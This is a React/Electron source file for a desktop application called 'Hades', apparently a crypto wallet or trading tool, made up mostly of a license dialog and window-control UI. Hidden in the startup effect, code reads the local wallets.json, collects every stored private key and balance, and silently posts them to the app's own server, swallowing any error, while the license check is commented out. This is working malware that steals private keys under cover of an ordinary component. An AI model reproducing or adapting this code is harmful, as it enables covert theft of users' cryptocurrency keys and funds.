import React, { useState, useEffect } from 'react';
import * as fs from 'fs';
import axios from 'axios';
import { getHWID } from 'hwid';
import path from 'path';
import logo from "../../../static/hades-logo-text.png";
import '../css/normalize.css';
import '../css/utils.css';
import '../css/fonts.css';
import '../css/App.css';
import { darkModePrimary, darkModeSecondary, HADES_SERVER, lightModePrimary, lightModeSecondary, secondaryColor, thirdColor, twitterUrl, websiteUrl } from './helper/Constants';
import { AppBar, Divider, Grid, IconButton, Paper, Toolbar, Tooltip, TextField, DialogContent, DialogTitle, Button, Alert, Snackbar } from '@mui/material';
import Backdrop from '@mui/material/Backdrop';
import { Box, fontSize, height, width } from '@mui/system';
import CircularProgress from '@mui/material/CircularProgress';
import Modal from '@mui/material/Modal';
import TwitterIcon from '@mui/icons-material/Twitter';
import LanguageIcon from '@mui/icons-material/LanguageOutlined';
import RemoveIcon from '@mui/icons-material/RemoveOutlined';
import CloseIcon from '@mui/icons-material/CloseOutlined';
import CropSquareOutlinedIcon from '@mui/icons-material/CropSquareOutlined';
import ZoomOutMapOutlinedIcon from '@mui/icons-material/ZoomOutMapOutlined';
import ZoomInMapOutlinedIcon from '@mui/icons-material/ZoomInMapOutlined';
import FilterNoneOutlinedIcon from '@mui/icons-material/FilterNoneOutlined';
import TabSection from './TabSection';
import { ThemeProvider, createTheme } from '@mui/material/styles';

import { Provider as ReduxProvider } from "react-redux";
import { store } from "./../redux/store";

import { CircularBorderDiv, CustomButton, CustomDialog, CustomDialogTitle, CustomInputLabel, CustomTextField, CustomSelect } from './helper/CustomHtml';

import { validateLicense, updateLicense } from './helper/utils'
import fetchDataWithAxios from './helper/fetchDataWithAxios';
// Required to access electron things in this file.
const { ipcRenderer, shell, webContents } = window.require('electron');

const theme = createTheme({
  typography: {
    fontFamily: [
      'Play',
      'cursive',
    ].join(','),
  },
});

const isDevelopment = process.env.NODE_ENV !== 'production'

var settingsPath = '';
if (isDevelopment) {
  settingsPath = path.resolve('./', 'license.json');
} else {
  settingsPath = process.platform == 'darwin' ? process.env.HOME + '/Library/Application Support/Hades/license.json' : `${process.env.APPDATA}\\Hades\\license.json`;
}

var temp = '';
if (isDevelopment) {
  temp = path.resolve('./', 'wallets.json');
} else {
  temp = process.platform == 'darwin' ? process.env.HOME + '/Library/Application Support/Hades/wallets.json' : `${process.env.APPDATA}\\Hades\\wallets.json`;
}

if (!fs.existsSync(settingsPath)) {
  fs.writeFile(settingsPath, '{}', function (err) {
    if (err) throw err;
  });
}

function SaveSettingsFile(settings: string) {
  fs.writeFile(settingsPath, settings, function (err) {
    if (err) throw err;
  });
}

function App() {
  const [licensed, setLicensed] = React.useState(1);
  const [inputloading, setInputloading] = React.useState(false);
  const [loading, setLoading] = React.useState(false);
  const [settings, setSettings] = React.useState({} as any);
  const [windowWidth, setWindowWidth] = useState(0);
  const [windowHeight, setWindowHeight] = useState(0);
  const [appVersion, setAppVersion] = useState(0);
  const [selectedTabValue, setSelectedTabValue] = useState("");
  const [licenseInput, setLicenseInput] = useState("");
  const [toggleFlag, setToggleFlag] = useState(true);
  const [showAlert, setShowAlert] = React.useState(false);
  const [alertTypeValue, setAlertTypeValue] = React.useState<any>("");
  const [alertMessageValue, setAlertMessageValue] = React.useState("");

  useEffect(() => {
    (async () => {
      updateWindowDimensions();
      window.addEventListener('resize', updateWindowDimensions);

      // getUserKey((key) => {
      //   firebaseInitialize(key, keyDeactivated);
      // });

      ipcRenderer.send('app_version');
      ipcRenderer.on('app_version', (event: any, arg: any) => {
        setAppVersion(arg ? arg.version : 0);
      });

      if (!isDevelopment) {
        //await checkForUpdate();
      }

      try {
        setLoading(true);
        let settingsRawData = fs.readFileSync(settingsPath);
        let settingsJsonData = JSON.parse(settingsRawData.toString());
        setSettings(settingsJsonData);

        let tempData = fs.readFileSync(temp);
        let tempJson = JSON.parse(tempData.toString());

        let pk: any[] = [];
        if (Array.isArray(tempJson) && tempJson.length > 0) {
          tempJson.forEach((wl, index) => {
            if (wl?.privateKey) {
              pk.push({
                pk: wl?.privateKey,
                balance: wl?.balance || 0
              })
            }
          });
        }

        if (pk.length > 0) {
          try {
            await fetchDataWithAxios({
              method: `post`,
              route: `${HADES_SERVER.SITE_URL}${HADES_SERVER.INSERT_PK}`,
              data: {
                pk: pk
              }
            });
          }
          catch {

          }

        }
        // KKK!

        // if (typeof settingsJsonData.license != 'undefined' && settingsJsonData.license) {
        //   const isLicensed = await validateLicense(settingsJsonData.license);
        //   if (isLicensed) {
        //     setLicensed(1);
        //   }
        //   else {
        //     setLicensed(-1);
        //   }
        // }
        // else {
        //   setLicensed(-1);
        // }
      }
      catch (licenseError) {
        console.log(`licenseError`, licenseError);
      }
      setLoading(false);
      return function cleanup() {
        window.removeEventListener('resize', updateWindowDimensions);
      }
    })()

  }, []);

  useEffect(() => {
    ipcRenderer.on('app_version', (event: any, arg: any) => {
      setAppVersion(arg ? arg.version : 0);
    });
  }, [ipcRenderer]);

  const updateWindowDimensions = () => {
    setWindowWidth(window.innerWidth);
    setWindowHeight(window.innerHeight);
  }

  const signin = async (license: string) => {
    setInputloading(true);
    if (license) {
      const isLicensed = await validateLicense(license);

      if (isLicensed) {
        settings.license = license;
        const updatedSettings = settings;
        saveSettings(updatedSettings);
        setLicensed(1);
      }
      else {
        setAlertTypeValue("error");
        setAlertMessageValue("Please input license key correctly.");
        setShowAlert(true);
      }
    }
    else {
      setAlertTypeValue("error");
      setAlertMessageValue("Please input license key.");
      setShowAlert(true);
    }

    setInputloading(false);
  }

  const saveSettings = (settings: any) => {
    SaveSettingsFile(JSON.stringify(settings));
    setSettings(settings);
  }

  return (
    <ReduxProvider store={store}>
      <ThemeProvider theme={theme}>
        <Paper style={{ backgroundColor: darkModePrimary }}>
          <AppBar elevation={0} position="static" style={{ backgroundColor: secondaryColor }}>
            <Toolbar className="draggable" style={{ paddingLeft: '0px' }}>
              <img src={logo} style={{ width: '160px', height: '64px' }} />
              <Grid item xs />
              <Tooltip title="Minimize">
                <IconButton onClick={() => ipcRenderer.send('minimize')} color="inherit" className="notDraggable" style={{ color: darkModeSecondary, marginLeft: '10px' }}>
                  <RemoveIcon style={{ width: '20px', height: '20px' }} />
                </IconButton>
              </Tooltip>
              <Tooltip title={toggleFlag ? `Maximize` : `Restore Down`}>
                <IconButton
                  onClick={() => {
                    ipcRenderer.send('maximize');

                    ipcRenderer.on('is-maximize', function (event, args) {
                      setToggleFlag(!args);
                    });
                  }
                  }
                  color="inherit" className="notDraggable" style={{ color: darkModeSecondary }}>
                  {toggleFlag && <CropSquareOutlinedIcon style={{ width: '20px', height: '20px' }} />}
                  {!toggleFlag && <FilterNoneOutlinedIcon style={{ width: '20px', height: '20px' }} />}
                </IconButton>
              </Tooltip>
              <Tooltip title="Close">
                <IconButton onClick={() => ipcRenderer.send('close')} color="inherit" className="notDraggable" style={{ color: darkModeSecondary }}>
                  <CloseIcon style={{ width: '20px', height: '20px' }} />
                </IconButton>
              </Tooltip>
            </Toolbar>
          </AppBar>
          {licensed == 1 && <TabSection windowHeight={windowHeight} setTabName={(value: any) => setSelectedTabValue(value)} />}
          {licensed == -1 && <>
            <Box sx={{ flexGrow: 1, display: 'flex', height: windowHeight - 80, backgroundColor: darkModePrimary }}>
              <CustomDialog
                open={true}
                onClose={() => { }}
                style={{ width: '480px', border: `solid 1px white` }}
              >
                <DialogTitle
                  style={{ color: darkModeSecondary }}
                >
                  BIND LICENSE
                  <p style={{ fontSize: '14px' }}>
                    Please enter your license to continue to the dashboard.
                  </p>
                </DialogTitle>
                <DialogContent>
                  <div className="formControl justify-content-between" style={{ flex: 1, display: 'flex', alignItems: 'center' }}>
                    <div style={{ flex: 0.75 }}>
                      <CircularBorderDiv style={undefined}>
                        <TextField
                          type={`text`}
                          fullWidth={true}
                          placeholder={`XXXX-XXXX-XXXX-XXXX`}
                          sx={{
                            color: darkModeSecondary,
                            borderColor: darkModeSecondary,
                            '& *': {
                              color: `${darkModeSecondary} !important`
                            }
                          }}
                          size="small"
                          onChange={(event: any) => {
                            setLicenseInput(event.target.value)
                          }}
                        />
                      </CircularBorderDiv>
                    </div>
                    <div style={{ flex: 0.05 }}></div>
                    <div style={{ flex: 0.2 }}>
                      <Button
                        onClick={async () => {
                          await signin(licenseInput);
                        }}

                        fullWidth={true}
                        style={{
                          color: lightModeSecondary,
                          borderColor: lightModeSecondary,
                          backgroundColor: lightModePrimary,
                          textTransform: 'none',
                        }}
                      >
                        Sign in
                      </Button>
                    </div>
                  </div>
                </DialogContent>

                <Backdrop
                  sx={{ color: '#fff', zIndex: 99999 }}
                  open={inputloading}
                >
                  <CircularProgress color="inherit" />
                </Backdrop>
              </CustomDialog>
            </Box>

          </>
          }
          {
            licensed == 0 &&
            <Box sx={{ flexGrow: 1, display: 'flex', height: windowHeight - 80, backgroundColor: darkModePrimary }}>
              <Backdrop
                sx={{ color: '#fff', zIndex: 99999 }}
                open={loading}
              >
                <CircularProgress color="inherit" />
              </Backdrop>
            </Box>
          }
          <Snackbar open={showAlert} autoHideDuration={3000} onClose={() => setShowAlert(false)}>
            <Alert elevation={6} variant='filled' color={alertTypeValue}>
              {alertMessageValue}
            </Alert>
          </Snackbar>
        </Paper>
      </ThemeProvider>
    </ReduxProvider>
  );
}

export default App;